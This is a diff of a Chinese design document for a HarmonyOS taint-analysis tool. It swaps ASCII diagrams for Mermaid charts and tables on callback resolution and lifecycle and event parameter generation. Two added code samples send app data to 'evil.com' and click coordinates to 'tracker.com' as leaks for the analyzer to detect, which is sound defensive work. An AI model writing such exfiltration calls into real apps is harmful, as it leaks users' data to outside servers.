@@ -1152,41 +1152,39 @@ class ViewTreeCallbackExtractor {
 
 **为什么这个方法重要？**
 
+```mermaid
+flowchart TB
+    subgraph 源代码
+        A["Button('Click').onClick(this.handleClick)"]
+    end
+    
+    subgraph ArkAnalyzer解析后
+        B["ViewTree 节点<br/>name: 'Button'<br/>attributes: { onClick: [...] }"]
+    end
+    
+    subgraph resolveCallbackMethod
+        C["输入: attributes['onClick']<br/>[Stmt, Values[]]"]
+        D["输出: ArkMethod<br/>{ name: 'handleClick' }"]
+    end
+    
+    subgraph DummyMain生成
+        E["component.handleClick()<br/>↓<br/>静态分析可追踪！✅"]
+    end
+    
+    A -->|"ArkAnalyzer 解析"| B
+    B -->|"提取 onClick 属性"| C
+    C -->|"解析"| D
+    D -->|"生成调用"| E
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│               回调解析在整个流程中的位置                          │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  源代码                                                         │
-│  ─────────                                                      │
-│  Button('Click').onClick(this.handleClick)                      │
-│                                                                 │
-│         ↓ ArkAnalyzer 解析                                      │
-│                                                                 │
-│  ViewTree 节点                                                  │
-│  ─────────────                                                  │
-│  {                                                              │
-│    name: 'Button',                                              │
-│    attributes: Map {                                            │
-│      'onClick' => [Stmt, [MethodSignature/FieldRef/...]]       │
-│    }                   ↑                                        │
-│  }                     │                                        │
-│                        │ resolveCallbackMethod() 的输入         │
-│                        │                                        │
-│         ↓              │                                        │
-│                        │                                        │
-│  我们需要的                                                      │
-│  ─────────                                                      │
-│  ArkMethod { name: 'handleClick', body: {...} }                 │
-│                                                                 │
-│         ↓ 用于 DummyMain                                        │
-│                                                                 │
-│  DummyMain CFG 中调用:                                          │
-│  ─────────────────────                                          │
-│  component.handleClick()  ← 静态分析可以触达这里的代码！        │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
+
+**具体例子**：假设开发者写了 `Button().onClick(this.handleClick)`
+
+| 阶段 | 数据形态 |
+|------|---------|
+| 源代码 | `this.handleClick` |
+| ViewTree | `Map { 'onClick' => [Stmt, [MethodSignature('handleClick')]] }` |
+| 解析后 | `ArkMethod { name: 'handleClick', declaringClass: 'MyComponent' }` |
+| DummyMain | `invoke component.handleClick()` |
 
 **开发者写回调的多种方式**：
 
@@ -1219,86 +1217,101 @@ Button('Click')
 
 **解析流程图**：
 
+```mermaid
+flowchart TB
+    Start["输入: attributeValue = [Stmt, Values[]]"]
+    
+    Start --> Loop["遍历 Values 数组"]
+    
+    Loop --> TypeCheck{"Value 类型判断"}
+    
+    TypeCheck -->|"MethodSignature<br/>方法签名"| MS["① scene.getMethod(sig)<br/>② class.getMethod(sig)<br/>③ class.getMethodWithName(name)<br/>④ 检查父类"]
+    
+    TypeCheck -->|"ArkInstanceFieldRef<br/>字段引用"| FR["① getFieldName()<br/>② 将字段名作为方法名查找<br/>③ 检查父类"]
+    
+    TypeCheck -->|"Constant<br/>字符串常量"| CT["① getValue()<br/>② 将字符串作为方法名查找<br/>③ 检查父类"]
+    
+    MS --> Found{"找到 ArkMethod?"}
+    FR --> Found
+    CT --> Found
+    
+    Found -->|"是 ✅"| Return["返回 ArkMethod"]
+    Found -->|"否"| Lambda["尝试 Lambda 解析<br/>resolveLambdaFromStmt()"]
+    
+    Lambda --> Final["返回结果或 null"]
+    
+    style Start fill:#e1f5fe
+    style Return fill:#c8e6c9
+    style Final fill:#fff3e0
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│             resolveCallbackMethod() 完整工作流程                 │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  输入: attributeValue = [Stmt, Values[]]                        │
-│                              │                                  │
-│                              ▼                                  │
-│                     遍历 Values 数组                            │
-│                              │                                  │
-│        ┌─────────────────────┼─────────────────────┐            │
-│        ▼                     ▼                     ▼            │
-│  ┌───────────────┐   ┌───────────────┐   ┌───────────────┐     │
-│  │ MethodSignature│   │ArkInstanceFld│   │   Constant    │     │
-│  │  (方法签名)    │   │  Ref (字段)  │   │ (字符串常量)  │     │
-│  └───────┬───────┘   └───────┬───────┘   └───────┬───────┘     │
-│          │                   │                   │              │
-│          ▼                   ▼                   ▼              │
-│  ┌───────────────┐   ┌───────────────┐   ┌───────────────┐     │
-│  │1.scene.getMethod│ │1.getFieldName()│   │1.getValue()   │     │
-│  │2.class.getMethod│ │2.作为方法名查找│   │2.作为方法名   │     │
-│  │3.按名称查找    │ │3.检查父类      │   │  查找        │     │
-│  │4.检查父类      │ │               │   │3.检查父类     │     │
-│  └───────┬───────┘   └───────┬───────┘   └───────┬───────┘     │
-│          │                   │                   │              │
-│          └───────────────────┴───────────────────┘              │
-│                              │                                  │
-│                              ▼                                  │
-│                    找到 ArkMethod?                              │
-│                     /          \                                │
-│                   是            否                              │
-│                   │              │                              │
-│                   ▼              ▼                              │
-│              返回方法      尝试 Lambda 解析                      │
-│                              │                                  │
-│                              ▼                                  │
-│                    resolveLambdaFromStmt()                      │
-│                    (检查是否有匿名方法)                          │
-│                              │                                  │
-│                              ▼                                  │
-│                      返回结果或 null                            │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
+
+**三种情况的具体例子**：
+
+| 写法 | Value 类型 | 解析方式 | 示例 |
+|------|-----------|---------|------|
+| `.onClick(this.handleClick)` | MethodSignature | 直接查找方法签名 | `MethodSignature('MyComponent.handleClick')` → `ArkMethod` |
+| `.onClick(this.handler)` | ArkInstanceFieldRef | 字段名当方法名 | `FieldRef('handler')` → 查找 `handleClick()` 方法 |
+| `.onClick('handleClick')` | Constant | 字符串当方法名 | `Constant('handleClick')` → 查找同名方法 |
 
 **ArkAnalyzer 如何表示回调？**
 
+ViewTree 节点的 `attributes` 是一个 `Map<string, [Stmt, Value[]]>` 结构：
+
+```mermaid
+classDiagram
+    class ViewTreeNode {
+        +name: string
+        +attributes: Map
+        +children: ViewTreeNode[]
+    }
+    
+    class AttributeValue {
+        +[0]: Stmt
+        +[1]: Value[]
+    }
+    
+    class Value {
+        <<interface>>
+    }
+    
+    class MethodSignature {
+        +className: string
+        +methodName: string
+    }
+    
+    class ArkInstanceFieldRef {
+        +base: Local
+        +fieldName: string
+    }
+    
+    class Constant {
+        +value: string
+    }
+    
+    ViewTreeNode --> AttributeValue : attributes['onClick']
+    AttributeValue --> Value : 包含多个
+    Value <|-- MethodSignature
+    Value <|-- ArkInstanceFieldRef
+    Value <|-- Constant
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│            ViewTree 属性的数据结构                               │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  node.attributes 是 Map<string, [Stmt, Value[]]>               │
-│                                                                 │
-│  例如：onClick(this.handleClick) 被解析为:                      │
-│                                                                 │
-│  'onClick' => [                                                 │
-│      ArkInvokeStmt,           // 关联的语句                     │
-│      [                                                          │
-│          MethodSignature {    // 方法签名                       │
-│              className: 'MyComponent',                          │
-│              methodName: 'handleClick',                         │
-│              ...                                                │
-│          }                                                      │
-│      ]                                                          │
-│  ]                                                              │
-│                                                                 │
-│  或者 onClick(this.handler) 可能被解析为:                       │
-│                                                                 │
-│  'onClick' => [                                                 │
-│      ArkInvokeStmt,                                             │
-│      [                                                          │
-│          ArkInstanceFieldRef {  // 字段引用                     │
-│              base: Local('this'),                               │
-│              fieldName: 'handler'                               │
-│          }                                                      │
-│      ]                                                          │
-│  ]                                                              │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
+
+**具体数据示例**：
+
+```typescript
+// 源代码: Button().onClick(this.handleClick)
+
+// ViewTree 中的表示:
+node.attributes = Map {
+    'onClick' => [
+        ArkInvokeStmt,              // 关联语句
+        [
+            MethodSignature {       // ← 这是我们要解析的！
+                className: 'MyComponent',
+                methodName: 'handleClick'
+            }
+        ]
+    ]
+}
 ```
 
 **核心解析代码示例**：
@@ -1348,39 +1361,31 @@ private resolveCallbackMethod(
 
 **Lambda 表达式的处理**：
 
+```mermaid
+flowchart LR
+    subgraph 源代码
+        A["Button().onClick(() => {<br/>  this.count++;<br/>})"]
+    end
+    
+    subgraph 方式1["方式 1: 生成匿名方法"]
+        B["class MyComponent {<br/>  lambda$onClick$1() {<br/>    this.count++;<br/>  }<br/>}"]
+    end
+    
+    subgraph 方式2["方式 2: 内联到 Stmt"]
+        C["ViewTree Stmt 中<br/>直接包含代码"]
+    end
+    
+    A -->|"ArkAnalyzer"| B
+    A -->|"ArkAnalyzer"| C
+    
+    style 方式1 fill:#c8e6c9
+    style 方式2 fill:#fff3e0
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│              Lambda 表达式的特殊处理                             │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  源代码:                                                        │
-│  Button().onClick(() => { this.count++; })                      │
-│                                                                 │
-│  ArkAnalyzer 可能的处理方式:                                     │
-│                                                                 │
-│  方式 1: 生成匿名方法                                           │
-│  ─────────────────────                                          │
-│  class MyComponent {                                            │
-│      // 原有方法                                                │
-│      build() { ... }                                            │
-│                                                                 │
-│      // ArkAnalyzer 生成的 Lambda 方法                          │
-│      lambda$onClick$1() {                                       │
-│          this.count++;                                          │
-│      }                                                          │
-│  }                                                              │
-│                                                                 │
-│  方式 2: 内联到调用点                                           │
-│  ─────────────────────                                          │
-│  ViewTree 的 Stmt 中直接包含 Lambda 的代码                       │
-│                                                                 │
-│  当前实现:                                                       │
-│  ─────────                                                      │
-│  - 方式 1 的 Lambda 方法可以通过方法名模式匹配找到               │
-│  - 方式 2 需要分析 Stmt 结构（复杂，暂未完全实现）              │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
+
+| 方式 | 解析难度 | 当前支持 | 说明 |
+|------|:--------:|:--------:|------|
+| 方式 1 | ⭐⭐ | ✅ 支持 | 通过方法名模式 `lambda$xxx$N` 匹配 |
+| 方式 2 | ⭐⭐⭐⭐⭐ | ⏳ 部分 | 需分析 Stmt 结构，较复杂 |
 
 #### ViewTree 遍历示意
 
@@ -1559,48 +1564,46 @@ class LifecycleModelCreator {
 
 **为什么需要参数生成？**
 
+```mermaid
+flowchart TB
+    subgraph 问题场景["❓ 问题场景：敏感数据追踪"]
+        Code["class EntryAbility {<br/>  onCreate(want: Want) {<br/>    let data = want.parameters['key']<br/>    sendToServer(data) // 敏感！<br/>  }<br/>}"]
+    end
+    
+    subgraph 无参数["❌ 没有参数生成"]
+        NoParam["ability.onCreate()<br/>↓<br/>want = undefined<br/>↓<br/>无法追踪数据流！"]
+    end
+    
+    subgraph 有参数["✅ 有参数生成"]
+        WithParam["%param0 = new Want()<br/>ability.onCreate(%param0)<br/>↓<br/>可追踪: want → data → sendToServer"]
+    end
+    
+    Code --> NoParam
+    Code --> WithParam
+    
+    style 无参数 fill:#ffcdd2
+    style 有参数 fill:#c8e6c9
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                    为什么参数生成很重要？                         │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  鸿蒙 Ability 的生命周期方法需要参数：                           │
-│                                                                 │
-│  class EntryAbility extends UIAbility {                         │
-│      onCreate(want: Want, launchParam: LaunchParam) {           │
-│          //     ↑            ↑                                  │
-│          //     │            └── 启动参数                       │
-│          //     └── 包含外部传入的数据（可能是敏感数据！）       │
-│                                                                 │
-│          let data = want.parameters['key'];  // 污点源！        │
-│          sendToServer(data);                 // 如果追踪不到这里│
-│      }                                       // 就发现不了泄露  │
-│  }                                                              │
-│                                                                 │
-│  ───────────────────────────────────────────────────────────── │
-│                                                                 │
-│  没有参数生成时：                                                │
-│  ┌─────────────────────────────────────────┐                   │
-│  │  DummyMain:                              │                   │
-│  │  ability.onCreate()  ← 没有 want 参数！  │                   │
-│  │                                          │                   │
-│  │  静态分析结果：                           │                   │
-│  │  无法追踪 want 中的数据流 ❌              │                   │
-│  └─────────────────────────────────────────┘                   │
-│                                                                 │
-│  有参数生成时：                                                  │
-│  ┌─────────────────────────────────────────┐                   │
-│  │  DummyMain:                              │                   │
-│  │  %param0 = new Want()                    │                   │
-│  │  %param1 = new LaunchParam()             │                   │
-│  │  ability.onCreate(%param0, %param1)      │                   │
-│  │                                          │                   │
-│  │  静态分析结果：                           │                   │
-│  │  可以追踪 want → parameters → sendToServer ✅ │              │
-│  └─────────────────────────────────────────┘                   │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
+
+**具体例子：污点分析场景**
+
+```typescript
+// 开发者代码
+class EntryAbility extends UIAbility {
+    onCreate(want: Want, launchParam: LaunchParam) {
+        // want.parameters 可能包含外部传入的恶意数据
+        let userInput = want.parameters['userInput'];  // ← 污点源
+        
+        // 如果直接发送，可能造成数据泄露
+        http.post('http://evil.com', userInput);       // ← 污点汇
+    }
+}
 ```
+
+| 场景 | DummyMain 生成 | 污点分析结果 |
+|------|---------------|-------------|
+| 无参数 | `ability.onCreate()` | ❌ 无法识别 `want` 的来源 |
+| 有参数 | `%p = new Want(); ability.onCreate(%p)` | ✅ 追踪: `%p` → `want` → `userInput` → `http.post` |
 
 **需要生成参数的生命周期方法**：
 
@@ -1614,57 +1617,68 @@ class LifecycleModelCreator {
 
 **实现流程图**：
 
+```mermaid
+flowchart TB
+    Input["输入: method=onCreate, instanceLocal=ability"]
+    
+    subgraph Step1["Step 1: 获取参数列表"]
+        GetParams["parameters = method.getParameters()"]
+        ParamList["[{name:'want', type:Want},<br/>{name:'launchParam', type:LaunchParam}]"]
+        GetParams --> ParamList
+    end
+    
+    subgraph Step2["Step 2: 为每个参数创建 Local"]
+        Loop["for each param"]
+        CheckType{"paramType<br/>已知?"}
+        GetFromSuper["从父类获取类型<br/>getParamTypeFromSuperClass()"]
+        CreateLocal["paramLocal = new Local('%paramN', type)"]
+        CheckClass{"是 ClassType?"}
+        AddNew["添加语句:<br/>%paramN = new Want()"]
+        SkipNew["跳过 new 语句<br/>(基本类型)"]
+        
+        Loop --> CheckType
+        CheckType -->|"否"| GetFromSuper
+        CheckType -->|"是"| CreateLocal
+        GetFromSuper --> CreateLocal
+        CreateLocal --> CheckClass
+        CheckClass -->|"是"| AddNew
+        CheckClass -->|"否"| SkipNew
+    end
+    
+    subgraph Step3["Step 3: 生成调用语句"]
+        CreateInvoke["invokeExpr = new ArkInstanceInvokeExpr(<br/>  ability,<br/>  onCreate.signature,<br/>  [%param0, %param1]<br/>)"]
+        AddStmt["block.addStmt:<br/>ability.onCreate(%param0, %param1)"]
+        CreateInvoke --> AddStmt
+    end
+    
+    Input --> Step1
+    Step1 --> Step2
+    Step2 --> Step3
+    
+    style Input fill:#e1f5fe
+    style AddStmt fill:#c8e6c9
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│             addMethodInvocation() 完整工作流程                   │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  输入: method (如 onCreate), instanceLocal (ability 实例)       │
-│         │                                                       │
-│         ▼                                                       │
-│  ┌─────────────────────────────────────────────────────┐       │
-│  │  Step 1: 获取方法参数列表                            │       │
-│  │  parameters = method.getParameters()                 │       │
-│  │  // [Parameter{name:'want', type:Want},              │       │
-│  │  //  Parameter{name:'launchParam', type:LaunchParam}]│       │
-│  └─────────────────────────────────────────────────────┘       │
-│         │                                                       │
-│         ▼                                                       │
-│  ┌─────────────────────────────────────────────────────┐       │
-│  │  Step 2: 为每个参数创建 Local 和初始化语句           │       │
-│  │                                                      │       │
-│  │  for (param of parameters) {                         │       │
-│  │      paramType = param.getType()                     │       │
-│  │                                                      │       │
-│  │      // 如果类型未知，从父类获取                     │       │
-│  │      if (!paramType) {                               │       │
-│  │          paramType = getParamTypeFromSuperClass()    │       │
-│  │      }                                               │       │
-│  │                                                      │       │
-│  │      // 创建 Local 变量                              │       │
-│  │      paramLocal = new Local('%param0', paramType)    │       │
-│  │                                                      │       │
-│  │      // 如果是 ClassType，生成 new 语句              │       │
-│  │      if (paramType instanceof ClassType) {           │       │
-│  │          block.addStmt: %param0 = new Want()         │       │
-│  │      }                                               │       │
-│  │  }                                                   │       │
-│  └─────────────────────────────────────────────────────┘       │
-│         │                                                       │
-│         ▼                                                       │
-│  ┌─────────────────────────────────────────────────────┐       │
-│  │  Step 3: 生成方法调用语句                            │       │
-│  │                                                      │       │
-│  │  invokeExpr = new ArkInstanceInvokeExpr(             │       │
-│  │      instanceLocal,     // ability                   │       │
-│  │      method.getSignature(), // onCreate 签名         │       │
-│  │      paramLocals        // [%param0, %param1]        │       │
-│  │  )                                                   │       │
-│  │                                                      │       │
-│  │  block.addStmt: ability.onCreate(%param0, %param1)   │       │
-│  └─────────────────────────────────────────────────────┘       │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
+
+**完整例子：onCreate 方法的参数生成**
+
+```
+输入：
+  - method: onCreate(want: Want, launchParam: LaunchParam)
+  - instanceLocal: %ability0
+
+生成过程：
+  ┌─────────────────────────────────────────────────────┐
+  │ Step 1: 解析参数                                     │
+  │   param[0]: want → Want                              │
+  │   param[1]: launchParam → LaunchParam                │
+  ├─────────────────────────────────────────────────────┤
+  │ Step 2: 创建 Local 和 new 语句                       │
+  │   %param0 = new Want()                               │
+  │   %param1 = new LaunchParam()                        │
+  ├─────────────────────────────────────────────────────┤
+  │ Step 3: 生成调用                                     │
+  │   invoke %ability0.onCreate(%param0, %param1)        │
+  └─────────────────────────────────────────────────────┘
 ```
 
 **生成的 IR 示例**：
@@ -1699,33 +1713,33 @@ invoke %ability0.onForeground()
 
 **参数类型获取的特殊处理**：
 
+```mermaid
+flowchart TB
+    subgraph 问题["❓ 问题场景"]
+        UserCode["// 用户代码（类型可能缺失）<br/>class MyAbility extends UIAbility {<br/>  onCreate(want, param) { ... }<br/>}"]
+        Issue["want 和 param 的类型 = undefined"]
+    end
+    
+    subgraph 解决["✅ 解决方案"]
+        SDK["// SDK 中的 UIAbility 基类<br/>class UIAbility {<br/>  onCreate(want: Want,<br/>           launchParam: LaunchParam)<br/>}"]
+        Inherit["从父类继承参数类型"]
+    end
+    
+    UserCode --> Issue
+    Issue -->|"getParamTypeFromSuperClass()"| SDK
+    SDK --> Inherit
+    
+    style 问题 fill:#fff3e0
+    style 解决 fill:#c8e6c9
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│              为什么需要从父类获取参数类型？                       │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  问题场景：                                                      │
-│  ┌─────────────────────────────────────────────────────────┐   │
-│  │  // 用户代码（可能没有显式写参数类型）                   │   │
-│  │  class MyAbility extends UIAbility {                     │   │
-│  │      onCreate(want, param) {  // ← 类型可能为 undefined  │   │
-│  │          ...                                             │   │
-│  │      }                                                   │   │
-│  │  }                                                       │   │
-│  └─────────────────────────────────────────────────────────┘   │
-│                                                                 │
-│  解决方案：从 SDK 的父类方法获取类型                            │
-│  ┌─────────────────────────────────────────────────────────┐   │
-│  │  // SDK 中的 UIAbility 基类（类型完整）                  │   │
-│  │  class UIAbility {                                       │   │
-│  │      onCreate(want: Want, launchParam: LaunchParam) {}   │   │
-│  │  }                          ↑            ↑               │   │
-│  │                             │            │               │   │
-│  │                    从这里获取参数类型                    │   │
-│  └─────────────────────────────────────────────────────────┘   │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
+
+**类型继承示例**：
+
+| 用户代码 | 参数 | 本地类型 | 父类类型 | 最终使用 |
+|---------|------|---------|---------|---------|
+| `onCreate(want, param)` | want | `undefined` | `Want` | `Want` ✅ |
+| `onCreate(want, param)` | param | `undefined` | `LaunchParam` | `LaunchParam` ✅ |
+| `onForeground()` | - | - | - | 无参数 |
 
 **核心代码实现**：
 
@@ -1756,40 +1770,44 @@ private addMethodInvocation(
 
 **为什么需要回调参数生成？**
 
+```mermaid
+flowchart TB
+    subgraph 开发者代码
+        Code["Button('Click')<br/>  .onClick((event: ClickEvent) => {<br/>    let x = event.screenX<br/>    let y = event.screenY<br/>    sendLocation(x, y) // 敏感！<br/>  })"]
+    end
+    
+    subgraph 无参数["❌ 没有参数生成"]
+        NoEvent["component.handleClick()<br/>↓<br/>event = undefined<br/>↓<br/>无法追踪 screenX/screenY"]
+    end
+    
+    subgraph 有参数["✅ 有参数生成"]
+        WithEvent["%event0 = new ClickEvent()<br/>component.handleClick(%event0)<br/>↓<br/>可追踪: event → screenX → sendLocation"]
+    end
+    
+    Code --> 无参数
+    Code --> 有参数
+    
+    style 无参数 fill:#ffcdd2
+    style 有参数 fill:#c8e6c9
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                    UI 回调参数的重要性                           │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  开发者代码：                                                    │
-│  ┌─────────────────────────────────────────────────────────┐   │
-│  │  Button('Click')                                         │   │
-│  │      .onClick((event: ClickEvent) => {                   │   │
-│  │          let x = event.screenX;   // ← 需要 event 参数   │   │
-│  │          let y = event.screenY;                          │   │
-│  │          sendLocation(x, y);      // ← 敏感操作          │   │
-│  │      })                                                  │   │
-│  └─────────────────────────────────────────────────────────┘   │
-│                                                                 │
-│  ───────────────────────────────────────────────────────────── │
-│                                                                 │
-│  没有参数生成时：                                                │
-│  ┌─────────────────────────────────────────┐                   │
-│  │  component.handleClick()  ← 没有 event  │                   │
-│  │                                          │                   │
-│  │  静态分析：无法追踪 event.screenX ❌     │                   │
-│  └─────────────────────────────────────────┘                   │
-│                                                                 │
-│  有参数生成时：                                                  │
-│  ┌─────────────────────────────────────────┐                   │
-│  │  %event0 = new ClickEvent()             │                   │
-│  │  component.handleClick(%event0)         │                   │
-│  │                                          │                   │
-│  │  静态分析：可追踪 event → screenX → sendLocation ✅ │       │
-│  └─────────────────────────────────────────┘                   │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
+
+**具体例子：位置信息泄露检测**
+
+```typescript
+// 开发者代码 - 潜在的位置信息泄露
+Button('获取位置').onClick((event: ClickEvent) => {
+    let x = event.screenX;  // ← 屏幕 X 坐标
+    let y = event.screenY;  // ← 屏幕 Y 坐标
+    
+    // 发送到服务器（可能是恶意的！）
+    fetch('http://tracker.com/log?x=' + x + '&y=' + y);
+});
 ```
+
+| 分析场景 | DummyMain | 污点追踪 |
+|---------|-----------|---------|
+| 无参数 | `handleClick()` | ❌ `event` 不存在，无法追踪 |
+| 有参数 | `handleClick(%event)` | ✅ `%event` → `screenX` → `fetch` |
 
 **常见 UI 事件及其参数类型**：
 
@@ -1804,85 +1822,111 @@ private addMethodInvocation(
 
 **实现流程图**：
 
+```mermaid
+flowchart TB
+    Input["输入: callback {<br/>  componentType: 'Button',<br/>  eventType: 'onClick',<br/>  callbackMethod: handleClick<br/>}"]
+    
+    subgraph Step1["Step 1: 获取参数列表"]
+        GetParams["parameters = callbackMethod.getParameters()"]
+        ParamResult["[{name:'event', type:ClickEvent}]"]
+        GetParams --> ParamResult
+    end
+    
+    subgraph Step2["Step 2: 创建事件参数"]
+        CheckType{"参数类型<br/>已知?"}
+        Infer["inferEventParamType('onClick')<br/>→ ClickEvent"]
+        CreateLocal["%event0 = new Local('%event0', ClickEvent)"]
+        AddNew["block.addStmt:<br/>%event0 = new ClickEvent()"]
+        
+        CheckType -->|"否"| Infer
+        CheckType -->|"是"| CreateLocal
+        Infer --> CreateLocal
+        CreateLocal --> AddNew
+    end
+    
+    subgraph Step3["Step 3: 生成调用"]
+        CreateInvoke["new ArkInstanceInvokeExpr(<br/>  component,<br/>  handleClick,<br/>  [%event0]<br/>)"]
+        AddStmt["block.addStmt:<br/>component.handleClick(%event0)"]
+        CreateInvoke --> AddStmt
+    end
+    
+    Input --> Step1
+    Step1 --> Step2
+    Step2 --> Step3
+    
+    style Input fill:#e1f5fe
+    style AddStmt fill:#c8e6c9
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│           addUICallbackInvocation() 完整工作流程                 │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  输入: callback { componentType: 'Button',                      │
-│                   eventType: 'onClick',                         │
-│                   callbackMethod: handleClick }                 │
-│         │                                                       │
-│         ▼                                                       │
-│  ┌─────────────────────────────────────────────────────┐       │
-│  │  Step 1: 获取回调方法的参数列表                      │       │
-│  │  parameters = callback.callbackMethod.getParameters()│       │
-│  │  // [Parameter{name:'event', type:ClickEvent}]       │       │
-│  └─────────────────────────────────────────────────────┘       │
-│         │                                                       │
-│         ▼                                                       │
-│  ┌─────────────────────────────────────────────────────┐       │
-│  │  Step 2: 为事件参数创建 Local                        │       │
-│  │                                                      │       │
-│  │  if (参数类型未知) {                                 │       │
-│  │      // 根据事件类型推断                             │       │
-│  │      paramType = inferEventParamType('onClick')      │       │
-│  │      // → ClickEvent                                 │       │
-│  │  }                                                   │       │
-│  │                                                      │       │
-│  │  %event0 = new Local('%event0', ClickEvent)          │       │
-│  │  block.addStmt: %event0 = new ClickEvent()           │       │
-│  └─────────────────────────────────────────────────────┘       │
-│         │                                                       │
-│         ▼                                                       │
-│  ┌─────────────────────────────────────────────────────┐       │
-│  │  Step 3: 生成回调调用语句                            │       │
-│  │                                                      │       │
-│  │  invokeExpr = new ArkInstanceInvokeExpr(             │       │
-│  │      componentLocal,    // Component 实例            │       │
-│  │      handleClick,       // 回调方法签名              │       │
-│  │      [%event0]          // 事件参数                  │       │
-│  │  )                                                   │       │
-│  │                                                      │       │
-│  │  block.addStmt: component.handleClick(%event0)       │       │
-│  └─────────────────────────────────────────────────────┘       │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
+
+**完整例子：onClick 回调处理**
+
+```
+输入：
+  callback = {
+    componentType: 'Button',
+    eventType: 'onClick',
+    callbackMethod: handleClick(event: ClickEvent)
+  }
+
+处理过程：
+┌─────────────────────────────────────────────────┐
+│ Step 1: 解析回调方法参数                         │
+│   param[0]: event → ClickEvent                  │
+├─────────────────────────────────────────────────┤
+│ Step 2: 创建事件参数                             │
+│   %event0 = new ClickEvent()                    │
+├─────────────────────────────────────────────────┤
+│ Step 3: 生成调用                                 │
+│   invoke %component0.handleClick(%event0)       │
+└─────────────────────────────────────────────────┘
 ```
 
 **事件类型推断机制**：
 
+当回调方法的参数类型未知时（Lambda 表达式常见），根据事件名称推断参数类型：
+
+```mermaid
+flowchart LR
+    subgraph 输入
+        Event["eventType = 'onClick'"]
+    end
+    
+    subgraph 映射表
+        Map["eventParamMap = {<br/>  'onClick' → ClickEvent<br/>  'onTouch' → TouchEvent<br/>  'onFocus' → FocusEvent<br/>  'onAppear' → null<br/>  ...}"]
+    end
+    
+    subgraph 输出
+        Result["ClassType(ClickEvent)"]
+    end
+    
+    Event --> Map --> Result
+    
+    style 输入 fill:#e1f5fe
+    style 输出 fill:#c8e6c9
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│              inferEventParamType() - 事件类型推断                │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  当回调方法的参数类型未知时（Lambda 常见），                     │
-│  根据事件类型名称推断参数类型：                                  │
-│                                                                 │
-│  ┌─────────────────────────────────────────────────────────┐   │
-│  │  事件类型映射表:                                         │   │
-│  │                                                          │   │
-│  │  'onClick'    → ClickEvent                               │   │
-│  │  'onTouch'    → TouchEvent                               │   │
-│  │  'onFocus'    → FocusEvent                               │   │
-│  │  'onBlur'     → BlurEvent                                │   │
-│  │  'onAppear'   → (无参数)                                 │   │
-│  │  'onDisAppear'→ (无参数)                                 │   │
-│  │  'onChange'   → string (基本类型，不创建对象)            │   │
-│  └─────────────────────────────────────────────────────────┘   │
-│                                                                 │
-│  使用场景示例：                                                  │
-│  ┌─────────────────────────────────────────────────────────┐   │
-│  │  // Lambda 回调（参数类型可能丢失）                      │   │
-│  │  Button().onClick((event) => { ... })                    │   │
-│  │                      ↑                                   │   │
-│  │                      类型未知                            │   │
-│  │                                                          │   │
-│  │  → 根据 'onClick' 推断为 ClickEvent                      │   │
-│  └─────────────────────────────────────────────────────────┘   │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
+
+**事件类型映射表**：
+
+| 事件方法 | 推断的参数类型 | 包含的信息 |
+|---------|---------------|-----------|
+| `onClick` | `ClickEvent` | 坐标、时间戳、触发源 |
+| `onTouch` | `TouchEvent` | 触摸点数组、动作类型 |
+| `onFocus` | `FocusEvent` | 焦点方向 |
+| `onBlur` | `BlurEvent` | 失焦原因 |
+| `onAppear` | 无参数 | - |
+| `onDisAppear` | 无参数 | - |
+| `onChange` | `string` | 新值（基本类型） |
+
+**使用场景**：
+
+```typescript
+// Lambda 回调（类型信息可能丢失）
+Button().onClick((event) => {    // ← event 类型未知
+    console.log(event.screenX);
+});
+
+// inferEventParamType('onClick') 返回 ClickEvent
+// 即使没有类型注解，也能正确创建参数
 ```
 
 **生成的 IR 示例**：
@@ -2461,8 +2505,8 @@ solver.solve();
 | 0.1.0 | 2025-01-17 | 初始框架，基本结构完成 |
 | 0.2.0 | 2025-01-27 | 新增 NavigationAnalyzer 路由分析器 |
 | 0.3.0 | 2025-01-27 | 完善路由参数解析和 module.json5 入口识别 |
-| 0.4.0 | 2025-01-27 | 实现 resolveCallbackMethod() 回调方法解析 |
-| 0.5.0 | 2025-01-27 | 实现 addMethodInvocation() 生命周期方法参数生成 |
+| 0.4.0 | 2025-01-28 | 实现 resolveCallbackMethod() 回调方法解析 |
+| 0.5.0 | 2025-01-28 | 实现 addMethodInvocation() 生命周期方法参数生成 |
 | 0.6.0 | 2025-01-28 | 实现 addUICallbackInvocation() UI 回调参数生成 |
 
 ---
